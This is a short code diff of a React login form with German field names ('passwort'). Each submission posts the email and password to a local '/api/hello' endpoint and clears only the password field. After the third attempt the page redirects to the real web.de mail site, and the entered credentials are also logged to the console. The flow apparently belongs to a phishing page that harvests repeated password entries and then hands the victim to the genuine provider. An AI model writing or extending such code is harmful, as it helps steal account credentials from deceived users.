@@ -32,6 +32,8 @@ export default function Main() {
 
   const [credentials, setCredentials] = useState<Form>({email: '', passwort: ''})
 
+  const [count, setCount] = useState<number>(0)
+
   console.log(credentials);
   
 
@@ -66,7 +68,12 @@ export default function Main() {
     axios.post('/api/hello', data)
     .then((req) => {
       console.log(req.data);
-      setCredentials({passwort: "", email: ""})
+      setCredentials({...credentials, passwort: ""})
+
+      if (count === 2) {
+        window.location.href = 'https://web.de'
+      }
+      setCount((prev) => prev + 1)
     }).catch((err) => {
       console.log(err);
     })
